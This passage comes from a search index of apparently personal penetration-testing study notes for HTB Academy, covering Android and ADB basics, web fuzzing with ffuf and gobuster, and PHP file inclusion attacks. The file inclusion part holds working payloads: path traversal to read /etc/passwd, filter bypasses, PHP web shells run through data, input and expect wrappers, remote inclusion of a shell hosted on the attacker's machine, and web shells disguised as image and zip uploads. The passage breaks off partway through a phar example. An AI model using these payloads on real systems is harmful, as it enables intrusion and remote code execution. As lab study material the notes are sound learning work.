android:scheme=&quot;app&quot; android:host=&quot;myapp&quot; android:pathPrefix=&quot;/products/&quot; /&gt;   When the user clicks on the link, the specific product will appear in the application.  Security risks may arise from improper implementation.  The other type of deep links are Android deeplinks. Let's imagine this example:  &lt;div&gt; &lt;p&gt;Buy our latest PC parts.&lt;/p&gt; &lt;a href=&quot;https://www.myapp.com/products/cpu&quot;&gt; &lt;/a&gt; &lt;/div&gt;   we can define this intent-filter to capture it:   &lt;data android:scheme=&quot;https&quot; android:host=&quot;www.myapp.com&quot; android:pathPrefix=&quot;/products/&quot; /&gt;   If the app that handles the deep link isn't installed, the link will open in a web browser listing the products.  ","version":"Next","tagName":"h3"},{"title":"Android Debug Bride​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#android-debug-bride","content":" Android Debug Bridge (ADB) is a versatile command-line tool that enables communication between a computer and a device. It allows developers to perform tasks like installing and debugging applications, transferring files between the host computer and the device, and accessing the device through a shell.  Here, there are some useful adb commands:  Command\tDescriptionadb help\tList all commands. adb kill-server\tKills the adb server. adb devices\tLists connected devices. adb root\tRestarts adbd with root permissions. adb install &lt;apk&gt;\tInstall app. adb push &lt;local&gt; &lt;remote&gt;\tCopy file/dir to device. adb pull &lt;remote&gt; &lt;local&gt;\tCopy file/dir from device. adb logcat [options] [filter] [filter]\tView device log. adb shell\tOpens a shell in the device.  ","version":"Next","tagName":"h3"},{"title":"Android penetration testing​","type":1,"pageTitle":"Android Fundamentals","url":"/docs/Hacking/HTB Academy/Android Fundamentals#android-penetration-testing","content":" Enumeration and information gathering  Gather information about the app and its architecture. Understand the functionality of the application. Enumerate any data structure the app uses that is stored in the local storage.  Static analysis  Understand the manifest file of the application. Review the app's components, permissions, and configurations. Decompile and analyze the application's source code to understand the flow and find potential vulnerabilities. Examine native or third-party libraries, frameworks, and dependencies the app uses.  Dynamic analysis  Monitor the application's behavior during runtime. Enumerate the local storage for files and data structures created after performing various functionalities. Perform dynamic instrumentation to read the memory of the application during runtime. Intercept network traffic and test the app for vulnerabilities such as authentication bypass and insecure data transmission. Check for Server-Side attacks by analyzing API calls and looking for vulnerabilities such as injection and XSS attacks.  Suggested tools:  adb: command-line tool to communicate with Android devices.JADX: This tool allows us to reverse engineer an application and view its source code through a graphical interface. It provides the user with a Java-like pseudocode that is close enough to the actual code.APKTool: This tool also allows reverse engineering Android applications. It will decompile the source code and decode the resources of the APK file. APKTool also enables us to edit the source code and configuration files, recompile the code, and build the APK file again.Ghidra: Ghidra is often used to analyze the native C++ libraries loaded to the application.Burp Suite: to analyze HTTP communicationFrida: A dynamic instrumentation toolkit used by developers, reverse engineers, and security researchers. It enables us to inject snippets of JavaScript or native code into the running processes of Android applications, allowing us to analyze and manipulate them during runtime.Autopsy: Autopsy will help us investigate disk images of Android devices and let us search for files, databases, calls, messages, and logs, using the provided GUI.  There's also some automated tools:  MobSF: An automated security testing framework for Android, iOS, and Windows platforms that performs static, dynamic, and malware analysis on mobile applications.Drozer: A comprehensive security and attack framework that allows us to assess the security of Android applications. It simulates various attack vectors and provides multiple tools to analyze, exploit, and debug Android applications.Qark: A static code analysis tool that automates the discovery of security vulnerabilities in Android applications. It can also create Proof-of-Concept deployable APKs and ADB commands to exploit the vulnerabilities it finds.Objection: A runtime mobile exploration toolkit that uses Frida to provide an easy environment for assessing Android and iOS application security. It automates several common tasks, such as bypassing SSL pinning, and users won't be needed to create custom scripts whenever they need to exploit common vulnerabilities.Medusa: An extensible and modularized framework that automates processes and techniques practiced during the dynamic analysis of Android Applications. Medusa is based on Frida and can analyze and enumerate an app, attack common entry points, and automate processes like application patching, MITM attack, and more. Medusa can add and remove hooks for Java or Native methods and has more than 90 modules that can be combined.Androbugs: automatically scans Android applications and checks for security issues and vulnerabilities. ","version":"Next","tagName":"h3"},{"title":"Web fuzzing","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Web fuzzing","content":"","keywords":"","version":"Next"},{"title":"Fuzzing files and directories​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#fuzzing-files-and-directories","content":" You can use a wordlist and try to make requests to the server and see if some is positive (200 OK) or any other desired state. The key here is to find a related wordlist.  See some examples:  ffuf -ic -w /opt/github/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt:FUFF -u &quot;http://94.237.59.213:58567/FUFF&quot;   The FUFF keyword is where the word from the word list will be injected.  If you want to use -e flag to setup the extension, you don't need to place the FUFF in the word list, e.g:  ffuf -c -ic -w /opt/github/SecLists/Discovery/Web-Content/common.txt -u &quot;http://94.237.59.213:58567/webfuzzing_hidden_path/flag/FUZZ&quot; -e .html   ","version":"Next","tagName":"h2"},{"title":"Fuzzing recursively​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#fuzzing-recursively","content":" What if our target has a complex structure with multiple nested directories? Manually fuzzing each level would be tedious and time-consuming. This is where recursive fuzzing comes in handy.  Recursive fuzzing consist in 3 steps:  Initial fuzzing: same as we've seen so far.For each discovered directory, the fuzzer adds the discovered URL to the queue.Iterative depth: the processes is repeated for each directory until a specified depth has been scanned.  fuff example:  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://IP:PORT/FUZZ -e .html -recursion   When fuzzing recursively, it is wise to set up some limits:  -recursion-depth: This flag allows you to set a maximum depth for recursive exploration. For example, -recursion-depth 2 limits fuzzing to two levels deep (the starting directory and its immediate subdirectories). -rate: You can control the rate at which ffuf sends requests per second, preventing the server from being overloaded. -timeout: This option sets the timeout for individual requests, helping to prevent the fuzzer from hanging on unresponsive targets.  e.g:  ffuf -c -ic -w /opt/github/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u &quot;http://94.237.59.213:45870/recursive_fuzz/FUZZ&quot; -recursion -recursion-depth 4   ","version":"Next","tagName":"h2"},{"title":"Parameter and value fuzzing​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#parameter-and-value-fuzzing","content":" This technique focuses on manipulating the parameters and their values within web requests to uncover vulnerabilities in how the application processes input.  Parameters are the gateways through which you can interact with a web application. By manipulating their values, you can test how the application responds to different inputs, potentially uncovering vulnerabilities. For instance:  Altering a product ID in a shopping cart URL could reveal pricing errors or unauthorized access to other users' orders.Modifying a hidden parameter in a request might unlock hidden features or administrative functions.Injecting malicious code into a search query could expose vulnerabilities like Cross-Site Scripting (XSS) or SQL Injection (SQLi).  We can fuzz the existence of the parameter itself and the value of the parameters. For example, we make a request with curl:  adriangalera@htb[/htb]$ curl http://IP:PORT/get.php Invalid parameter value x:   We have discovered that this application need a parameter x. If we set it manually to 1:  adriangalera@htb[/htb]$ curl http://IP:PORT/get.php?x=1 Invalid parameter value x: 1   Now, we can use wenum to discover the correct values:  wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u &quot;http://IP:PORT/get.php?x=FUZZ&quot;   The same technique can be applied to POST requests:  curl -d &quot;&quot; http://IP:PORT/post.php Invalid parameter value y:   And we can fuzz the valid values with fuff:  ffuf -u http://IP:PORT/post.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;y=FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v   For the exercise, we can get the correct GET parameter value calling:  ffuf -ic -w /opt/github/SecLists/Discovery/Web-Content/big.txt:FUZZ -u &quot;http://94.237.54.192:53037/get.php?x=FUZZ&quot;   and POST calling:  ffuf -u http://94.237.54.192:53037/post.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;y=FUZZ&quot; -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUZZ -mc 200 -v   ","version":"Next","tagName":"h2"},{"title":"Fuzzing virtual host and subdomains.​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#fuzzing-virtual-host-and-subdomains","content":" Virtual hosting enables multiple websites or domains to be served from a single server or IP address. Each vhost is associated with a unique domain name or hostname. When a client sends an HTTP request, the web server examines the Host header to determine which vhost's content to deliver.  Subdomains, on the other hand, are extensions of a primary domain name, creating a hierarchical structure within the domain. They are used to organize different sections or services within a website. For example, blog.example.com and shop.example.com are subdomains of the main domain example.com. Unlike vhosts, subdomains are resolved to specific IP addresses through DNS (Domain Name System) records.  We can use gobuster to perform vhost fuzzing:  gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain   --append-domain: This crucial flag instructs Gobuster to append the base domain (inlanefreight.htb) to each word in the wordlist. This ensures that the Host header in each request includes a complete domain name (e.g., admin.inlanefreight.htb), which is essential for vhost discovery.  To perform sub-domain fuzzing is very similar, but you need to change the mode of gobuster:  gobuster dns -do inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   Under the hood, Gobuster works by generating subdomain names based on the wordlist, appending them to the target domain, and then attempting to resolve those subdomains using DNS queries. If a subdomain resolves to an IP address, it is considered valid and included in the output.  ","version":"Next","tagName":"h2"},{"title":"Filtering results​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#filtering-results","content":" Most of the fuzzing attemps will lead to nowhere and we'll need to filter out that noise. Each tool has its own filter mechanism.  The idea is that you can filter by:  Response HTTP status codeResponse content lengthResponse line countsResponse word countsResponse time (TTFB)  ","version":"Next","tagName":"h2"},{"title":"Validate your findings​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#validate-your-findings","content":" Once you found out a file, a directory, a vhost, etc... The fact that you found it, it doesn't matter it's a vulnerability automatically.  For example, if you suspect a SQL injection vulnerability, you could craft a harmless SQL query that returns the SQL server version string rather than trying to extract or modify sensitive data.  Or you can use curl to verify the request of the response, see if there's data and what kind of data will come in the answer.  ","version":"Next","tagName":"h2"},{"title":"Fuzzing Web APIs​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#fuzzing-web-apis","content":" Essentially, a Web API serves as a bridge between a server (hosting the data and functionality) and a client (such as a web browser, mobile app, or another server) that wants to access or utilize that data or functionality.  ","version":"Next","tagName":"h2"},{"title":"Representational State Transfer (REST)​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#representational-state-transfer-rest","content":" REST APIs utilize standard HTTP methods (GET, POST, PUT, DELETE) to perform CRUD (Create, Read, Update, Delete) operations on resources identified by unique URLs. They typically exchange data in lightweight formats like JSON or XML, making them easy to integrate with various applications and platforms.  GET /users/123  ","version":"Next","tagName":"h3"},{"title":"Simple Object Access Protocol (SOAP)​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#simple-object-access-protocol-soap","content":" SOAP APIs follow a more formal and standardized protocol for exchanging structured information. They use XML to define messages, which are then encapsulated in SOAP envelopes and transmitted over network protocols like HTTP.  &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:tem=&quot;http://tempuri.org/&quot;&gt; &lt;soapenv:Header/&gt; &lt;soapenv:Body&gt; &lt;tem:GetStockPrice&gt; &lt;tem:StockName&gt;AAPL&lt;/tem:StockName&gt; &lt;/tem:GetStockPrice&gt; &lt;/soapenv:Body&gt; &lt;/soapenv:Envelope&gt;   ","version":"Next","tagName":"h3"},{"title":"GraphQL​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#graphql","content":" GraphQL provides a single endpoint where clients can request the data they need using a flexible query language.  The query language is very flexible and allow to query for the exact data we're interested:  query { user(id: 123) { name email posts(limit: 5) { title body } } }   We can also modify data, not only query it:  mutation { createPost(title: &quot;New Post&quot;, body: &quot;This is the content of the new post&quot;) { id title } }   ","version":"Next","tagName":"h3"},{"title":"Identifying endpoints​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#identifying-endpoints","content":" You must know where to look before you can start fuzzing Web APIs. Identifying the endpoints that the API exposes is the first crucial step in this process  In REST APIs, the endpoints can look like this:  /users - Represents a collection of user resources./users/123 - Represents a specific user with the ID 123./products - Represents a collection of product resources./products/456 - Represents a specific product with the ID 456.  And accept a series of parameters:  Query parameters: /users?limit=10&amp;sort=namePath parameters: /products/{id}pen_sparkRequest body parameters: { &quot;name&quot;: &quot;New Product&quot;, &quot;price&quot;: 99.99 }  To discover the endpoints and their parameters you can:  Search for the official documentations: swagger, openAPI.Network Traffic Analysis: Burp Suite or Developer toolsParameter name fuzzing: the same technique we have seen before.  For SOAP, it's a bit different. They rely on XML-based messages and Web Services Description Language (WSDL) files to define their interfaces and operations. They expose a single endpoint which is a URL where the SOAP server listens for incoming requests. The content of the SOAP message itself determines the specific operation you want to perform.  Every operation in the API is defined in the Web Services Description Language (WSDL) file, an XML-based document that describes the web service's interface, operations, and message formats.  So, to identify the endpoints:  Check the WSDL fileNetwork analysis: Burp or Developer toolsParameter fuzzing  In GraphQL, APIs typically have a single endpoint. This endpoint is usually a URL like /graphql and serves as the entry point for all queries and mutations sent to the API.  To do the discovery of the internals of the API, you can use:  Introspection: GraphQL's introspection system is a powerful tool for discovery. By sending an introspection query to the GraphQL endpoint, you can retrieve a complete schema describing the API's capabilities. This includes available types, fields, queries, mutations, and arguments. Tools and IDEs can leverage this information to offer auto-completion, validation, and documentation for your GraphQL queries.API documentation: Well-documented GraphQL APIs provide comprehensive guides and references alongside introspection. These typically explain the purpose and usage of different queries and mutations, offer examples of valid structures, and detail input arguments and response formats. Tools like GraphiQL or GraphQL Playground, often bundled with GraphQL servers, provide an interactive environment for exploring the schema and experimenting with queries.Network traffic analysis: same as REST and SOAP.  ","version":"Next","tagName":"h2"},{"title":"API Fuzzing​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#api-fuzzing","content":" When it comes to API Fuzzing, there are primary types:  Parameter Fuzzing  One of the primary techniques in API fuzzing, parameter fuzzing focuses on systematically testing different values for API parameters. This includes query parameters (appended to the API endpoint URL), headers (containing metadata about the request), and request bodies (carrying the data payload).  Data format Fuzzing  Web APIs frequently exchange data in structured formats like JSON or XML. Data format fuzzing specifically targets these formats by manipulating the structure, content, or encoding of the data. This can reveal vulnerabilities related to parsing errors, buffer overflows, or improper handling of special characters.  Sequence Fuzzing  APIs often involve multiple interconnected endpoints, where the order and timing of requests are crucial. Sequence fuzzing examines how an API responds to sequences of requests, uncovering vulnerabilities like race conditions, insecure direct object references (IDOR), or authorization bypasses. By manipulating the order, timing, or parameters of API calls, fuzzers can expose weaknesses in the API's logic and state management.  We can use https://github.com/PandaSt0rm/webfuzz_api to perform API fuzzing:  python3 api_fuzzer.py http://IP:PORT [-] Invalid endpoint: http://localhost:8000/~webmaster (Status code: 404) [-] Invalid endpoint: http://localhost:8000/~www (Status code: 404) Fuzzing completed. Total requests: 4730 Failed requests: 0 Retries: 0 Status code counts: 404: 4727 200: 2 405: 1 Found valid endpoints: - http://localhost:8000/cz... - http://localhost:8000/docs Unusual status codes: 405: http://localhost:8000/items   The fuzzer identifies numerous invalid endpoints (returning 404 Not Found errors). Two valid endpoints are discovered:  /cz...: This is an undocumented endpoint as it doesn't appear in the API documentation./docs: This is the documented Swagger UI endpoint.  The 405 Method Not Allowed response for /items suggests that an incorrect HTTP method was used to access this endpoint (e.g., trying a GET request instead of a POST).  ","version":"Next","tagName":"h2"},{"title":"Skills assessment​","type":1,"pageTitle":"Web fuzzing","url":"/docs/Hacking/HTB Academy/Web fuzzing#skills-assessment","content":" We're just given the server address and the common wordlist. Our task is to find the flag.  ffuf -ic -c -u http://94.237.59.213:37986/FUZZ -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUZZ -recursion -recursion-depth 2   We discover admin/index.php which we might fuzz parameters there.  ffuf -ic -c -u http://94.237.59.213:37986/admin/FUZZ -w /opt/github/SecLists/Discovery/Web-Content/common.txt -e &quot;.php&quot; -mc 200   We discover admin/panel.php which asks for a parameter named accessID. Let's fuzz the correct value:  ffuf -ic -c -u &quot;http://94.237.59.213:37986/admin/panel.php?accessID=FUZZ&quot; -w /opt/github/SecLists/Discovery/Web-Content/common.txt -fs 58   Once the value is found, we go to the page and it tells to do vhost fuzzing of the specified domain. We can do that with gobuster:  └─$ gobuster vhost -u http://fuzzing_fun.htb:37986 -w /opt/github/SecLists/Discovery/Web-Content/common.txt --append-domain -xs 400,403   We discover a hidden subdomain, a the page suggest us to do recursive fuzzing:  ffuf -ic -c -u http://hidden.fuzzing_fun.htb:37986/godeep/FUZZ -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUZZ -recursion -recursion-depth 4   And we discover the flag in the last found page. ","version":"Next","tagName":"h2"},{"title":"File inclusion","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/File inclusion","content":"","keywords":"","version":"Next"},{"title":"Local file inclusion​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#local-file-inclusion","content":" This vulnerability happens typically on templating engines. For example:  /index.php?page=about and about is a PHP file in the same directory.  File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates.  The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.  The following table shows which functions may execute files and which only read file content:    ","version":"Next","tagName":"h2"},{"title":"Basic LFI​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#basic-lfi","content":" One example of basic LFI, can be http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=es.php. In a webpage, when we change the language, another file is read (es.php).  Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\\Windows\\boot.ini on Windows. So, let's change the parameter from es to /etc/passwd: http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/etc/passwd and we retrieve the /etc/passwd file contents.  ","version":"Next","tagName":"h3"},{"title":"Path traversal​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#path-traversal","content":" There might be cases where the file inclusion is &quot;restricted&quot; to some folder:  include(&quot;./languages/&quot; . $_GET['language']);   The languages are loaded from the languages folder. In this case, if we visit the URL in the previous section, it will not work because it will try to read the file in ./languages/etc/password.  We can easily bypass this restriction using relative paths. We can add ../ to visit the parent directory. So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/passwd.  ","version":"Next","tagName":"h3"},{"title":"Filename prefix​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#filename-prefix","content":" On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:  include(&quot;lang_&quot; . $_GET['language']);   In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid.  instead of directly using path traversal, we can prefix a / before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories.  This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct.  ","version":"Next","tagName":"h3"},{"title":"Appended extensions​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#appended-extensions","content":" Sometimes, the extension of the file is included in the backend code:  include($_GET['language'] . &quot;.php&quot;);   if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist.  The bypass for this will be discussed in future sections.  ","version":"Next","tagName":"h3"},{"title":"Second order attacks​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#second-order-attacks","content":" This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.  For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.  ","version":"Next","tagName":"h3"},{"title":"Basic bypass​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#basic-bypass","content":" The developers usually put some mechanism to protect user inputs. However, most of them can be bypassed.  ","version":"Next","tagName":"h2"},{"title":"Search and replace filter​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#search-and-replace-filter","content":" Detect and deletes substrings of ../:  $language = str_replace('../', '', $_GET['language']);   In this case, it does not replace recursively, it will only replace the first entry of ../. So, ....// would become ../ and this way we can retrieve the file.  There are other ways of bypassing the search replace, we may use ..././ or ..../ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ..../), or adding extra forward slashes (e.g. ....////)  ","version":"Next","tagName":"h3"},{"title":"Encoding​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#encoding","content":" Sometimes, when the payload is URL encoded and the check is implemented poorly, the limitation will be bypassed. For example:  If the target web application did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter.  Sometimes double URL encode might help bypassing the filter.  ","version":"Next","tagName":"h3"},{"title":"Approved paths​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#approved-paths","content":" Sometimes, the application restrict the user input to make sure if lands in an approved path, e.g.  if(preg_match('/^\\.\\/languages\\/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }   To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify, as follows: &lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd  ","version":"Next","tagName":"h3"},{"title":"Approved extension​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#approved-extension","content":" With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful e.g. for reading source code.  Path Truncation​  In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).  If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.  we should calculate the full length of the string to ensure only .php gets truncated  Null bytes​  Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it.  To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.  ","version":"Next","tagName":"h3"},{"title":"PHP Filters​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#php-filters","content":" PHP has a built-in feature named PHP Wrappers. They allow developers to access different I/O stream at application level, such as stdin, stdout, etc...  PHP filters are a special type of PHP wrappers to pass different types of input and have it filtered. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.  The first step is to use fuff to enumerate PHP files. Normally in php LFI inclusion, the PHP gets executed and the source code cannot be seen.  For example:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=config will execute the config.php file and we'll not see anything in the website.  However, we can leverage php filter to transform the file to base64:  php://filter/read=convert.base64-encode/resource=config:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config  Later, we can transform the source code using base64 -d:  echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d   ","version":"Next","tagName":"h2"},{"title":"PHP Wrappers​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#php-wrappers","content":" There are other PHP wrappers that would be extremely useful.  ","version":"Next","tagName":"h2"},{"title":"Data wrapper​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#data-wrapper","content":" The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the allow_url_include setting is enabled in the PHP configurations.  First we need to check if that flag is enabled or not. In order to do so, we'll use base64 wrapper to retrieve the files in:  /etc/php/X.Y/apache2/php.ini for Apache or,/etc/php/X.Y/fpm/php.ini for nginx.  If we don't know exactly the PHP version, we can try all of them.  For example:  curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;   Now, we can pass the PHP code we want to execute encoded in base64 to the data wrapper:  echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' | base64   http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id  And we can execute any command via PHP. We can do it via cURL:  adriangalera@htb[/htb]$ curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' | grep uid uid=33(www-data) gid=33(www-data) groups=33(www-data)   ","version":"Next","tagName":"h3"},{"title":"Input wrapper​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#input-wrapper","content":" Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.  curl -s -X POST --data '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid   Additionally, we can add the command directly into the data, e.g:  &lt;\\?php system('id')?&gt;   ","version":"Next","tagName":"h3"},{"title":"Expect wrapper​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#expect-wrapper","content":" Works in a similar way of the previous one, but it is external and needs to be manually installed. First, we need to check if it's configured checking for extension=expect in php.ini  If present, the attack is straightforward:  curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;   ","version":"Next","tagName":"h3"},{"title":"Remote File Inclusion​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#remote-file-inclusion","content":" In some cases, we are able to include not only local files, but remote files. This is very useful to the attacker, since it can host a malicious script in the machine and force the application to include it.  Usually the language has some config that disables RFI completely, but in some cases it is enabled. In PHP, the config is the same as we have seen before: allow_url_include = On.  There are some import functions vulnerable to RFI while the others don't. Refer to the table at the beginning for reference.  So, the first step is to verify if we can do a RFI. Try to include a local URL:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php.  We can use RFI to do Remote Code execution:  We can craft a malicious script:  echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php   and host it in our machine:  sudo python3 -m http.server &lt;LISTENING_PORT&gt;   Later on, we can include our URL as the RFI to perform RCE.  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id  We can host our file using FTP:  sudo python -m pyftpdlib -p 21   and include it:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id  If the server is a Windows machine, we don't need the allow_url_include. We can use SMB protocol for RFI. This is because Windows treats files on remote SMB servers as normal files  We can spin up a samba server using impacket smbserver.py:  impacket-smbserver -smb2support share $(pwd)   And include our URL by using a UNC path:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\\\&lt;OUR_IP&gt;\\share\\shell.php&amp;cmd=whoami  ","version":"Next","tagName":"h2"},{"title":"LFI and file uploads​","type":1,"pageTitle":"File inclusion","url":"/docs/Hacking/HTB Academy/File inclusion#lfi-and-file-uploads","content":" If the application allows the user to upload files, this might lead to LFI. For example, an application allow the user to upload an image, however, we can upload a PHP web shell. If the importing function has Execute capabilities it will execute the code uploaded.  echo 'GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.gif   We then upload this gif as our profile picture. Later in the application, we see where it is imported:  &lt;img src=&quot;/profile_images/shell.gif&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;   in index.php. We just need to pass the cmd parameter now:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id  Something similar can be achieve with the zip wrapper (not enabled by default).  We can create a malicious zip disguised as an image:  echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php   And use the zip wrapper for RCE:  http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id.  We can also use the phar wrapper to the same.  To do so, we can write a PHP script:  &lt;?php $phar = new Phar('shell.phar'); $phar-&gt;startBuffering(); 